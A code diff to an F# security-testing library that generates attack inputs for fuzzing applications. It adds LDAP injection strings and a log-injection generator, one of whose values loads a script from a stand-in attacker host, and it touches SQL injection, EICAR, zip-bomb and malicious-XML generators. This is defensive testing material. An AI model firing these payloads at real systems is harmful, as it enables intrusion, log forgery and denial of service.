@@ -1,5 +1,6 @@
 namespace FSecurity
 
+/// Representation of a size indication (MB, GB, ...)
 type Metric = MB | GB
 
 /// Module that holds the security testing functionality
@@ -17,7 +18,7 @@ module FSec =
     /// an attacker can find out how the XML data is structured, or access data that he may not normally have access to.
     /// (more info: https://www.owasp.org/index.php/XPATH_Injection)
     ///
-    /// _Severity_: Critical
+    /// _Severity_: Critical <br/>
     /// _Vulnerability Indicators_: incorrect/invalid syntax, syntax error, runtime errors, XPathException, System.Xml.XPath 
     [<CompiledName("XPathInject")>]
     let xpathInject =
@@ -31,7 +32,7 @@ module FSec =
     /// Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign 
     /// and trusted web sites. (more info: https://www.owasp.org/index.php/Cross-site_Scripting_(XSS))
     ///
-    /// _Severity_: Critical
+    /// _Severity_: Critical <br/>
     /// _Vulnerability Indicators_: payload exists in response
     [<CompiledName("XssInject")>]
     let xssInject =
@@ -44,8 +45,8 @@ module FSec =
     /// A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application. 
     /// A successful SQL injection exploit can read sensitive data from the database, modify database data, 
     /// execute administration operations on the database etc. (more info: https://www.owasp.org/index.php/SQL_Injection)
-    ///
-    /// _Severity_: Critical
+    ///<br/>
+    /// _Severity_: Critical <br/>
     /// _Vulnerability Indicators_: incorrect/invalid syntax, syntax error, runtime errors, invalid SQL statement, conversion failed, SQLite exception, cannot open database, System.Data.SqlException, ...
     [<CompiledName("SqlInject")>]
     let sqlInject =
@@ -74,6 +75,49 @@ module FSec =
               "'))) or 1=1 or ((('1'='1"
               "))) or 1=1 or (((\"1\"=\"1" ]
 
+    /// LDAP input generator that provides LDAP injection strings. 
+    /// When receiving an "unusable" response from the SUT, it may be vulnerable for LDAP injection.
+    /// An "unusable" response could be a random user record, list of users, ...
+    /// LDAP is a lightweight system to manage credentials and authenticating users. 
+    /// When a application is vulnerable to LDAP injection, a malicious user may can query
+    /// sensitive data from other or even modify/delete it entirely.
+    ///
+    /// _Severity_: Critical <br/>
+    /// _Vulnerability Indicators_: unusable responses
+    [<CompiledName("LdapInject")>]
+    let ldapInject =
+        Gen.elements
+            [ "*"; "*)(|(cn=*"; "*)(|(cn=*)"; "*)(|(cn=*))" ]
+
+    /// LDAP input generator with a specified 'normal input' that provides LDAP injection strings.
+    /// The 'normal input' should be something legitimate.
+    /// When receiving an "unusable" response from the SUT, it may be vulnerable for LDAP injection.
+    /// An "unusable" response could be a random user record, list of users, ...
+    /// LDAP is a lightweight system to manage credentials and authenticating users. 
+    /// When a application is vulnerable to LDAP injection, a malicious user may can query
+    /// sensitive data from other or even modify/delete it entirely.
+    ///
+    /// _Severity_: Critical <br/>
+    /// _Vulnerability Indicators_: unusable responses
+    [<CompiledName("LdapWithNormalInject")>]
+    let ldapWithNormalInject x =
+        Gen.oneof 
+            [ ldapInject
+              Gen.elements 
+                [ sprintf "%s)(|(cn=*" x
+                  sprintf "%s)(|(cn=*)" x 
+                  sprintf "%s)(|(cn=*))" x ] ]
+
+    /// Log input generator to test log injection vulnerability. Inputs that are most-likely be logged can be vulnerable for injection.
+    /// This generator will give you injection strings that will try to inject layout with xterm, XSS injection and add additional lines in a xterm environment
+    /// with the text 'User admin logged in'.
+    [<CompiledName("LogInject")>]
+    let logInject =
+        Gen.elements
+            [ "%1B%5B%32%4A"
+              "%0AUser admin logged in"
+              """<script src="http://attacker.example.org/xss_exploit.js"/>""" ]
+
     let private guid () = Guid.NewGuid().ToString()
     let private (</>) x y = Path.Combine (x, y)
 
@@ -82,6 +126,7 @@ module FSec =
     /// - `dir` - Location of where the file should be stored
     /// - `x` - Value to define the file size (in MB or GB)
     /// - `m` - Metric to define the Unit of the file size
+    [<CompiledName("FileOfSize")>]
     let fileOfSize x (m : Metric) (dir : DirectoryInfo) =
         let size = match m with MB -> 1048576L | GB -> 1073741824L
         let path = dir.FullName </> guid() + ".test"
@@ -95,6 +140,7 @@ module FSec =
     /// - `depth` - Represent the depth of the zip bomb: how many levels should the zip bomb have?
     /// - `width` - Represent the width of the zip bomb: how many files should there be on each depth-level?
     /// - `start` - Represent the start file of the zip bomb. This file is copied over and over to create the zip bomb.
+    [<CompiledName("ZipBombDepthWidth")>]
     let zipBombDepthWidth depth width (start : FileInfo) =
         let mkFileName ext = guid() + ext
         let zipFiles xs =
@@ -124,6 +170,7 @@ module FSec =
 
     /// Illegal file name generator to validate the file uploading mechanism.
     /// Generate file names with semicolons, reserved names, percent sign, ampersand, ...
+    [<CompiledName("FileIllegalNames")>]
     let fileIllegalNames =
         Gen.elements 
             [ "a:b.txt"     // Colon not allowed on most OSes
@@ -139,6 +186,7 @@ module FSec =
 
     /// Eicar virus represented as a stream containing the virus content.
     /// For more info about the Eicar virus: http://www.eicar.org/86-0-Intended-use.html
+    [<CompiledName("EicarVirus")>]
     let eicarVirus = (fun () ->
         let eicar = "X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
         new MemoryStream (System.Text.Encoding.UTF8.GetBytes eicar) :> Stream) ()
@@ -170,33 +218,27 @@ module FSec =
     /// ## Parameters
     /// - `depth` - Defines the depth of the XML document
     /// - `tagLen` - Defines the length of the tag names
+    [<CompiledName("XmlMaliciousDepthTagLen")>]
     let xmlMaliciousDepthTagLen depth tagLen =
         let randomAttrOfLength l =
-            Gen.elements ['a'..'z']
-            |> Gen.map (string)
-            |> Gen.zip Arb.generate<int>
-            |> Gen.map (fun (x, y) -> sprintf "%s=\"%i\"" y x)
-            |> Gen.listOfLength l
-            |> Gen.map (List.distinctBy (fun s ->
-                let loc = s.IndexOf '='
-                s.Substring (0, loc)) 
-                >> List.reduce (sprintf "%s %s"))
-            |> Gen.listOfLength depth
+            [1..l]
+            |> Seq.fold (fun acc x -> sprintf "%s a%i=\"%i\"" acc x x) ""
+            |> Gen.constant
+            |> Gen.listOfLength depth;
 
         let randomTag = 
             Gen.elements [ 'a'..'z' ]
             |> Gen.listOfLength tagLen
-            |> Gen.map (List.map string >> List.reduce (+))
+            |> Gen.map (Seq.map string >> Seq.reduce (+))
         
         randomTag
         |> Gen.listOfLength depth
         |> Gen.zip (Gen.choose (100, 1000) >>= randomAttrOfLength)
         |> Gen.map (fun (attrs, xs) ->
-            let os = attrs |> List.map2 (sprintf "<%s %s>") xs
-            let cs = xs |> List.rev |> List.map (sprintf "</%s>")
-            [ "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" ] 
-            @ os @ cs
-            |> List.reduce (+))
+            [ yield "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
+              yield! attrs |> Seq.map2 (sprintf "<%s %s>") xs
+              yield! xs |> Seq.rev |> Seq.map (sprintf "</%s>") ]
+            |> Seq.reduce (+))
 
     /// Malicious XML generator: generates a XML structure with a depth of 1-100, a tag length of 100-1000 and a attribute count of 100-100.
     /// With this generator you can detect failures in naive XML parsers.
@@ -209,6 +251,7 @@ module FSec =
     /// Generates an url with hidden specified query parameters: `admin=true`, `debug=true`.
     /// ## Parameters
     /// - `baseUrl` - The base URL to add the generated query parameters
+    [<CompiledName("UrlHiddenAdmin")>]
     let urlHiddenAdmin baseUrl =
         Gen.elements [ "admin=true"; "debug=true" ]
         |> Gen.map (sprintf """%s?%s""" baseUrl)
@@ -217,6 +260,7 @@ module FSec =
     /// ## Parameters
     /// - `baseUrl` - The base URL to add the generated query parameters
     /// - `args` - Map containing a query parameter names and their generator for its value
+    [<CompiledName("UrlTampered")>]
     let urlTampered baseUrl args =
         args
         |> Map.map (fun k v -> 
@@ -232,22 +276,18 @@ module FSec =
     /// ## Parameters
     /// - `baseUrl` - The base URL to add the injection
     /// - `args` - List containing all the query parameter names
+    [<CompiledName("UrlInject")>]
     let urlInject baseUrl args =
         args
         |> List.map (fun a -> a, xssInject)
         |> Map.ofList
         |> urlTampered baseUrl
-    
-    /// Generates an url with injected JavaScript for the given query parameters.
-    /// ## Parameters
-    /// - `baseUrl` - The base URL to add the injection
-    /// - `args` - List containing all the query parameter names
-    let UrlInject (baseUrl, args) = urlInject baseUrl args
 
     /// Generates an url with an additional "bogus" query parameters added to the specified base url.
     /// ## Parameters
     /// - `baseUrl` - The base URL to add the generated query parsameters
     /// - `args` - Map containing a query parameter names and their generator for its value
+    [<CompiledName("UrlBogus")>]
     let urlBogus baseUrl args =
         let appendMap = Map.fold (fun acc k v ->
             match Map.tryFind k acc with
@@ -270,7 +310,8 @@ module FSec =
     /// ## Parameters
     /// - `baseUrl` - The base URL to add the generated query parsameters
     /// - `args` - Map containing a query parameter names and their generator for its value
-    let UrlBogus (baseUrl, args : IDictionary<string, Gen<_>>) =
+    [<CompiledName("UrlBogus")>]
+    let urlBogusDict baseUrl (args : IDictionary<string, Gen<_>>) =
         (args :> seq<_>)
         |> Seq.map (|KeyValue|)
         |> Map.ofSeq
